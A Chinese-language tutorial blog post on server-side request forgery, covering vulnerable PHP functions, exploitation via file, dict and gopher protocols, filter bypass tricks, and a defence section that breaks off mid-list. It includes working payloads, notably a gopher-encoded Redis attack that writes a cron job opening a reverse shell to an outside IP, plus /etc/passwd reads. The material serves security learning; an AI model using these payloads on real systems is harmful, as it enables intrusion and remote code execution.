    <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>SSRF与CSRF有一些相似之处，也有很大区别。</p><span id="more"></span><h1 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h1><p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。<br>SSRF 形成的原因大都是由于服务端提供了从其他服务器应用获取数据的功能且没有对目标地址做过滤与限制。比如从指定 URL 地址获取网页文本内容，加载指定地址的图片，下载等等。<br><img src="/simg/ssrf_1.png" alt=" "><br><img src="/simg/ssrf_2.png" alt=" "></p><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。<br>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p><h1 id="漏洞场景"><a href="#漏洞场景" class="headerlink" title="漏洞场景"></a>漏洞场景</h1><p>了解了漏洞的原理后，我们知道所有能发起请求的地方都可能会存在SSRF漏洞，我们可以根据“漏洞代码”中的常见方法对项目进行自查。以下列举一些最容易出现本漏洞的场景：</p><ol><li>能填写链接的地方</li></ol><ul><li>业务场景</li><li>从URL上传图片</li><li>订阅RSS</li><li>爬虫</li><li>预览</li><li>离线下载</li></ul><ol start="2"><li>数据库内置功能</li></ol><ul><li>Oracle</li><li>MongoDB</li><li>MSSQL</li><li>Postgres</li><li>CouchDB</li></ul><ol start="3"><li>邮箱服务器收取其他邮箱邮件</li></ol><ul><li>POP3&#x2F;IMAP&#x2F;SMTP</li></ul><ol start="4"><li>文件处理、编码处理、属性处理</li></ol><ul><li>FFmpeg</li><li>ImageMagick</li><li>Docx</li><li>PDF</li><li>XML</li></ul><h1 id="利用方式"><a href="#利用方式" class="headerlink" title="利用方式"></a>利用方式</h1><p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。<br>主要分为两个方向，SSRF 利用相关的危险函数；SSRF 可利用的协议操作。</p><ul><li>访问正常文件<br>访问正常文件，例如 提交参数：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://www.baidu.com/robots.txt</span><br></pre></td></tr></table></figure></li><li>端口扫描<br>当访问未开放端口，脚本会显示空白或报错。例如 提交参数：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://127.0.0.1:1234</span><br></pre></td></tr></table></figure>当访问开放端口时，脚本会显示banner信息：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=dict://127.0.0.1:3306</span><br></pre></td></tr></table></figure></li><li>读取系统本地文件<br>利用file协议可以任意读取系统本地文件，提交参数：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=file://c:windows/system32/drivers/etc/hosts</span><br></pre></td></tr></table></figure></li><li>内网web应用指纹识别<br>识别内网应用使用的框架，平台，模块以及cms可以为后续的渗透测试提供很多帮助。大多数web应用框架都有一些独特的文件和目录。通过这些文件可以识别出应用的类型，甚至详细的版本。根据这些信息就可以针对性的搜索漏洞进行攻击。<br>比如可以通过访问下列文件来判断phpMyAdmin是否安装以及详细版本：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?url=http://localhost/phpmyadmin/README</span><br></pre></td></tr></table></figure></li><li>攻击内网应用<br>内网的安全通常都很薄弱，溢出、弱口令等一般都是存在的。通过ssrf攻击，可以实现对内网的访问，从而可以攻击内网应用或本地机器，获得shell，这里的应用包括服务、web应用等。<br>仅仅通过get方法可以攻击的web应用有很多，比如struts2命令执行等。<br>以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">curl -vvv &#x27;dict://127.0.0.1:6379/info&#x27;</span><br><span class="line">curl -vvv &#x27;file:///etc/passwd&#x27;</span><br><span class="line"># * 注意: 链接使用单引号，避免$变量问题</span><br><span class="line"></span><br><span class="line">curl -vvv &#x27;gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a&#x27;</span><br></pre></td></tr></table></figure></li></ul><h1 id="相关函数"><a href="#相关函数" class="headerlink" title="相关函数"></a>相关函数</h1><h2 id="file-get-contents"><a href="#file-get-contents" class="headerlink" title="file_get_contents"></a>file_get_contents</h2><p>file_get_contents这一函数是把传入的参数(变量)写入字符串，当把 传参是内网文件的时候，会先去吧这个文件的内容读出来再写入，导致了任意文件读取，也就是信息泄露的一种。一般这种攻击也与目录遍历相结合。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$url</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$url</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上述测试代码中，file_get_contents()函数将整个文件或一个url所指向的文件读入一个字符串中，并展示给用户，我们构造类似于ssrf.php?url&#x3D;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd的payload即可读取服务器本地的任意文件。<br><img src="/simg/ssrf_3.png" alt=" "><br>readfile()函数与file_get_contents()函数相似。</p><h2 id="fsockopen"><a href="#fsockopen" class="headerlink" title="fsockopen"></a>fsockopen</h2><p><code>fsockopen($hostname,$port,$errno,$errstr,$timeout)</code><br>hostname: 如果安装了 OpenSSL，那么可以在主机名地址前面添加 ssl:&#x2F;&#x2F; 或者是 tls:&#x2F;&#x2F;，从而可以使用基于 TCP&#x2F;IP 协议的 SSL 或者 TLS 的客户端连接到远程主机。<br>port: 端口号。可以省略该参数或传 -1，则表示传输器不使用端口，例如 unix:&#x2F;&#x2F;。<br>errno: 如果errno的返回值为0，而且这个函数的返回值为FALSE，那么这表明该错误发生在套接字连接（connect()）调用之前，导致连接失败的原因最大的可能是初始化套接字的时候发生了错误。<br>errstr: 错误信息将以字符串的信息返回。<br>timeout: 设置连接的时限，单位为秒。fsockopen()的连接时限（timeout）的参数仅仅在套接字连接的时候生效。</p><p>用于打开一个网络连接或一个unix套接字连接，初始化一个套接字连接到指定主机（hostname），实现对用户指定url数据的获取。该函数会使用socket跟服务器建立tcp连接，进行传输原始数据。fsockopen()将返回一个文件句柄，之后可以被其它文件类函数调用（如：fgets(),fgetss(),fwrite(),fclose()还有feof()）。如果调用失败，将会返回false。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$host</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$fp</span>=<span class="title function_ invoke__">fsockopen</span>(<span class="variable">$host</span>, <span class="number">80</span>, <span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="number">30</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="variable">$fp</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$errstr</span> (<span class="subst">$errno</span>)&lt;br/&gt;\n&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$out</span> = <span class="string">&quot;GET / HTTP/1.1\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Host: <span class="subst">$host</span>\r\n&quot;</span>;</span><br><span class="line"><span class="variable">$out</span> .= <span class="string">&quot;Connection: close\r\n\r\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$fp</span>, <span class="variable">$out</span>);</span><br><span class="line"><span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>)) &#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>, <span class="number">128</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>构造ssrf.php?url=www.baidu.com即可成功触发ssrf并返回百度主页：</code><br><img src="/simg/ssrf_4.png" alt=" "></p><h2 id="curl-exec"><a href="#curl-exec" class="headerlink" title="curl_exec"></a>curl_exec</h2><p>cURL是一个利用URL语法在命令行下工作的文件传输工具，1997年首次发行。它支持文件上传和下载，所以是综合传输工具，但按传统，习惯称cURL为下载工具。cURL还包含了用于程序开发的libcurl。<br>curl_exec — 执行 cURL 会话</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl_exec(resource $ch): mixed</span><br></pre></td></tr></table></figure><p>执行给定的 cURL 会话。<br>这个函数应该在初始化一个 cURL 会话并且全部的选项都被设置后被调用。<br>成功时返回 true， 或者在失败时返回 false。 然而，如果 设置了 CURLOPT_RETURNTRANSFER 选项，函数执行成功时会返回执行的结果，失败时返回 false 。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ssrf.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$link</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;url&#x27;</span>];</span><br><span class="line"><span class="variable">$curlobj</span> = <span class="title function_ invoke__">curl_init</span>();  <span class="comment">// 创建新的cURL资源</span></span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_POST, <span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_URL, <span class="variable">$link</span>);</span><br><span class="line"><span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$curlobj</span>, CURLOPT_OPTRETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$curlobj</span>);  <span class="comment">// 抓取URL并把它传给浏览器</span></span><br><span class="line"><span class="title function_ invoke__">curl_close</span>(<span class="variable">$curlobj</span>);  <span class="comment">// 关闭cURL资源，并且释放系统资源</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $filename = &#x27;./curled/&#x27;.rand().&#x27;.txt&#x27;;</span></span><br><span class="line"><span class="comment">// file_put_content($filename, $result);</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$result</span>&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><code>构造ssrf.php?url=www.baidu.com即可成功触发ssrf并返回百度主页：</code><br><img src="/simg/ssrf_5.png" alt=" "></p><h1 id="相关协议"><a href="#相关协议" class="headerlink" title="相关协议"></a>相关协议</h1><p>SSRF漏洞的利用所涉及的协议有：</p><ul><li>file协议： 在有回显的情况下，利用 file 协议可以读取任意文件的内容</li><li>dict协议：泄露安装软件版本信息，查看端口，操作内网redis服务等</li><li>gopher协议：gopher支持发出GET、POST请求。可以先截获get请求包和post请求包，再构造成符合gopher协议的请求。gopher协议是ssrf利用中一个最强大的协议(俗称万能协议)。可用于反弹shell</li><li>http&#x2F;s协议：探测内网主机存活</li></ul><h2 id="File协议"><a href="#File协议" class="headerlink" title="File协议"></a>File协议</h2><p>payload的利用：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///etc/password # file:// 之后可以接任意文件</span><br></pre></td></tr></table></figure><p>这里的 Payload 只是一个基础示范，还可以读取很多文件，在实战渗透当中，更多情况应该是通过 GET 请求攻击的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://ip/index.php?url=file:///etc/password</span><br></pre></td></tr></table></figure><h2 id="HTTP协议"><a href="#HTTP协议" class="headerlink" title="HTTP协议"></a>HTTP协议</h2><p>探测一下内网活着的主机（但是很多不会开Http协议，没多大用）<br>抓一下包，在Burp里面探测一下就行</p><h2 id="dict协议"><a href="#dict协议" class="headerlink" title="dict协议"></a>dict协议</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dict://ip/info 可获取本地redis服务配置信息</span><br></pre></td></tr></table></figure><p>如果在靶场当中要尝试 dict 协议读取 Redis 需要先安装一下 redis-server</p><h2 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h2><p>Gopher是Internet上一个非常有名的信息查找系统，它将Internet上的文件组织成某种索引，很方便地将用户从Internet的一处带到另一处。在WWW出现之前，Gopher是Internet上最主要的信息检索工具，Gopher站点也是最主要的站点，使用tcp70端口。但在WWW出现后，Gopher失去了昔日的辉煌。现在它基本过时，人们很少再使用它；<br>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议。<br>gopher协议在各个编程语言中的限制：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">php  --write-curlwrappers且php版本至少为5.3</span><br><span class="line">—wite-curlwrappers选项含义：运用curl工具打开url流</span><br><span class="line">curl使用curl —version查看版本以及支持的协议</span><br><span class="line">Java小于JDK1.7</span><br><span class="line">Curl 低版本不支持</span><br><span class="line">Perl 支持</span><br><span class="line">ASP.NET 小于版本3</span><br></pre></td></tr></table></figure><p>Curl的所需参数是一个URL，即URLEncode后的链接（重点）</p><ul><li>格式：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_后接TCP数据流</span><br><span class="line">gopher的默认端口是70</span><br><span class="line">如果发起post请求，回车换行需要使用%0d%0a，如果多个参数，参数之间的&amp;也需要进行URL编码（详细注意事项见下）</span><br></pre></td></tr></table></figure>gopher发送get请求</li><li>问号（?）需要转码为URL编码，也就是%3f</li><li>回车换行要变为%0d%0a，但如果直接用工具转，可能只会有%0a</li><li>在HTTP包的最后要加上%0d%0a，代表消息结束（具体可研究HTTP包结束）<br>可直接转换的脚本：<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">import reimport urllib.parsedata=\    &#x27;&#x27;&#x27;GET /try.php?a=Wan&amp;b=Zifeng HTTP/1.1Host: 192.168.0.130:8201Cache-Control: max-age=0Upgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9Connection: close&#x27;&#x27;&#x27;data=urllib.parse.quote(data)strinfo=re.compile(&#x27;%0A&#x27;,re.I)new=strinfo.sub(&#x27;%0D%0A&#x27;,data)new=&#x27;gopher://192.168.0.130:8201/_&#x27;+new+&#x27;%0D%0A&#x27;new=urllib.parse.quote(new)with open(&#x27;Result.txt&#x27;,&#x27;w&#x27;) as f:    f.write(new)with open(&#x27;Result.txt&#x27;,&#x27;r&#x27;) as f:    for line in f.readlines():        print(line.strip())</span><br></pre></td></tr></table></figure>因为Burp是抓取浏览器URLEncode编码后的数据，所以我们得对整个gopher协议进行二次编码<br>这样到达服务器一次解码得到的就是<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://192.168.0.130:8201/_GET%20/try.php%3Fa%3DWan%26b%3DZifeng%20HTTP/1.1%0D%0AHost%3A%20192.168.0.130%3A8201%0D%0ACache-Control%3A%20max-age%3D0%0D%0AUpgrade-Insecure-Requests%3A%201%0D%0AUser-Agent%3A%20Mozilla/5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20×64%29%20AppleWebKit/537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome/92.0.4515.159%20Safari/537.36%0D%0AAccept%3A%20text/html%2Capplication/xhtml%2Bxml%2Capplication/xml%3Bq%3D0.9%2Cimage/avif%2Cimage/webp%2Cimage/apng%2C%2A/%2A%3Bq%3D0.8%2Capplication/signed-exchange%3Bv%3Db3%3Bq%3D0.9%0D%0AAccept-Encoding%3A%20gzip%2C%20deflate%0D%0AAccept-Language%3A%20zh-CN%2Czh%3Bq%3D0.9%0D%0AConnection%3A%20close%0D%0A</span><br></pre></td></tr></table></figure>这样就是可以正常解析的URL（Gopher发送的TCP数据流要求是URLEncode后的，毕竟是伪协议嘛），丢给Curl函数执行完事</li></ul><p>gopher发送post请求<br>和get请求一样，放入脚本编码后即可放入url中。<br>post请求：如果是Content-type为application&#x2F;x-www-form-urlencoded，那么POST数据也应进行二次编码（该选项含义就是URL编码后的数据）</p><p>使用注意事项</p><ul><li>大部分 PHP 并不会开启 fopen 的 gopher wrapper</li><li>file_get_contents 的 gopher 协议不能 URLencode</li><li>file_get_contents 关于 Gopher 的 302 跳转有 bug，导致利用失败</li><li>PHP 的 curl 默认不 follow 302 跳转</li><li>curl&#x2F;libcurl 7.43 上 gopher 协议存在 bug（%00 截断），经测试 7.49 可用</li></ul><p><a href="https://www.anquanke.com/post/id/262430#h3-5">gopher协议</a></p><h2 id="Redis未授权攻击"><a href="#Redis未授权攻击" class="headerlink" title="Redis未授权攻击"></a>Redis未授权攻击</h2><p>常用redis命令</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h $1 flushall</span><br><span class="line">echo -e &quot;\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1\n\n&quot;|redis-cli -h $1 -x set 1</span><br><span class="line">redis-cli -h $1 config set dir /var/spool/cron/</span><br><span class="line">redis-cli -h $1 config set dbfilename root</span><br><span class="line">redis-cli -h $1 save</span><br><span class="line">//redis-cli查看所有的keys及清空所有的数据</span><br></pre></td></tr></table></figure><p>这便是常见的exp，只需自己更改IP和端口即可，改成适配于Gopher协议的 URL：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0</span><br></pre></td></tr></table></figure><p>经过url解码便是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_*1 $8 flushall *3 $3 set $1 1 $64 */1 * * * * bash -i &gt;&amp; /dev/tcp/127.0.0.1/45952 0&gt;&amp;1 *4 $6 config $3 set $3 dir $16 /var/www/html/ *4 $6 config $3 set $10 dbfilename $4 root *1 $4 save quit</span><br></pre></td></tr></table></figure><h1 id="绕过手法"><a href="#绕过手法" class="headerlink" title="绕过手法"></a>绕过手法</h1><h2 id="绕过"><a href="#绕过" class="headerlink" title="@绕过"></a>@绕过</h2><p>URL的完整格式是</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]</span><br></pre></td></tr></table></figure><p>所以访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=”http://baidu.com@1.1.1.1″”&gt;http://baidu.com@1.1.1.1</span><br><span class="line">和</span><br><span class="line">http://1.1.1.1</span><br><span class="line">效果相同，因为解析的本来就是@后面的服务器地址</span><br></pre></td></tr></table></figure><h2 id="进制绕过"><a href="#进制绕过" class="headerlink" title="进制绕过"></a>进制绕过</h2><p>以PHP为例，一般后端用正则匹配IP长这个样子:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$str = &#x27;&#x27;;$isMatched = preg_match_all(&#x27;/((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;)(\.((2(5[0-5]|[0-4]\d))|[0-1]?\d&#123;1,2&#125;))&#123;3&#125;/&#x27;, $str, $matches);var_dump($isMatched, $matches);</span><br></pre></td></tr></table></figure><p>所以可以换成各种进制进行绕过:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">字符串:       10.0.0.3</span><br><span class="line">二进制:       00001010 . 00000000 . 00000000 . 00000011</span><br><span class="line">十六进制:    0A.00.00.03</span><br><span class="line">整数:           167772163</span><br></pre></td></tr></table></figure><p>这些表达方式都能被curl命令解析为正确的IP地址，之后如果我们要访问的IP地址被简单粗暴地过滤了就可以试试这种方法。除了上面的表达方式之外，还可以用 16 进制0x0A000003表示IP地址，还有一个很少人知道的绕过小姿势，就是用 8 进制代替 10 进制来表示 IP 地址。在计算机的世界里，一旦在20前面加个0就会变成8进制，比如<code>http://01200000003实际上还是http://10.0.0.3</code><br>上面两个表达方式，PHP 的 curl 模块能解析出来。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">十六进制：   http://0x0A.0x00.0x00.0x03</span><br><span class="line">八进制：       http://012.00.00.03</span><br><span class="line">八进制溢出：http://265.0.0.3</span><br></pre></td></tr></table></figure><h2 id="重定向绕过-amp-短网址绕过"><a href="#重定向绕过-amp-短网址绕过" class="headerlink" title="重定向绕过&amp;短网址绕过"></a>重定向绕过&amp;短网址绕过</h2><p>一般来说，PHP里的重定向长这样</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?phpfunction redirect($url)&#123;    header(&quot;Location: $url&quot;);    exit();&#125;</span><br></pre></td></tr></table></figure><p>如果192.168.0.1.xip.io都被过滤了，但是重定向没有被控制；你可以去<strong>TINYURL</strong>生成一个短URL</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问短URL的流程就是</span><br><span class="line">https://tinyurl.com/4czmrv9d-&gt;302跳转-&gt;成功访问192.168.0.1</span><br><span class="line">这样就成功绕过了检查</span><br></pre></td></tr></table></figure><h2 id="冷门协议绕过"><a href="#冷门协议绕过" class="headerlink" title="冷门协议绕过"></a>冷门协议绕过</h2><p>如果是php，可以试试php所有的伪协议以及冷门的非HTTP协议：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php://系列zip:// &amp; bzip2:// &amp; zlib://系列data://phar://file:///dict://sftp://ftp://tftp://ldap://gopher://</span><br></pre></td></tr></table></figure><h2 id="特殊用法绕过"><a href="#特殊用法绕过" class="headerlink" title="特殊用法绕过"></a>特殊用法绕过</h2><p>下面这俩可以试试绕过127.0.0.1:80，不一定有效</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://[::]:80/ http://0000::1:80/http://0/</span><br></pre></td></tr></table></figure><p>中文句号也可以试试</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">192。168。0。1</span><br></pre></td></tr></table></figure><h2 id="xip-io和xip-name"><a href="#xip-io和xip-name" class="headerlink" title="xip.io和xip.name"></a>xip.io和xip.name</h2><p><strong>xip.io</strong> 是一个提供通配符 DNS 解析的魔法域名。你可以无需配置，将自定义的任何域名解析到指定的 IP 地址。假设你的 IP 地址是 10.0.0.1，你只需使用 前缀域名+IP地址+xip.io 即可完成相应自定义域名解析。<br><strong>xip.name</strong> 是受 xip.io 启发，使用 Golang 开发的一个支持通配符的 DNS 服务器。<br><a href="https://cloud.tencent.com/developer/article/1825757">详细解释</a></p><h2 id="利用IPv6"><a href="#利用IPv6" class="headerlink" title="利用IPv6"></a>利用IPv6</h2><p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code>[::] 0000::1</code> 或IPv6的内网域名来绕过过滤。</p><h2 id="利用IDN"><a href="#利用IDN" class="headerlink" title="利用IDN"></a>利用IDN</h2><p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。<br>在这些字符中，部分字符会在访问时做一个等价转换。<br>可在该网站挑选合适的字符进行替代：<a href="https://www.mp51.vip/Code/AllUniCode?quwei=2460-24FF">替代字符</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ⓌⓌⓌ.ⓑⓐⓘⓓⓤ.ⓒⓞⓜ 完全等价于 https://www.baidu.com</span><br></pre></td></tr></table></figure><p>当然，适用于域名而不适用与直接IP访问</p><h2 id="DNS重绑定"><a href="#DNS重绑定" class="headerlink" title="DNS重绑定"></a>DNS重绑定</h2><p>对于浏览器来说，两次访问的都是同一域名，是符合浏览器的同源策略的，但是第二次访问解析到其他IP，调用到了其他资源。这样的行为被称之为域名重新绑定攻击（DNS ReBinding）。</p><ul><li>判定逻辑：<br>判定所给的IP或者域名解析后的IP是否在黑名单中<br>若在，退出报错<br>若不在，再次访问所给的IP或者域名解析后的IP；执行后续业务模块<br>所以思路很简单：只需要有个域名，但是它映射两个IP；同时设置TTL为0，能方便两个IP即刻切换<br>效果类比：访问wwfcww.xyz这个域名，第一次解析的IP是192.168.0.1；而第二次解析的IP是127.0.0.1<br>这个操作，就叫做DNS重绑定，如此一来便可进行SSRF攻击。</li></ul><h1 id="SSRF的防御"><a href="#SSRF的防御" class="headerlink" title="SSRF的防御"></a>SSRF的防御</h1><ul><li>限制协议<br>仅允许http&#x2F;https请求</li><li>限制IP<br>避免应用被用来获取内网数据，攻击内网</li><li>限制端口<br>限制请求的端口为http常用的端口，比如80, 443, 8080, 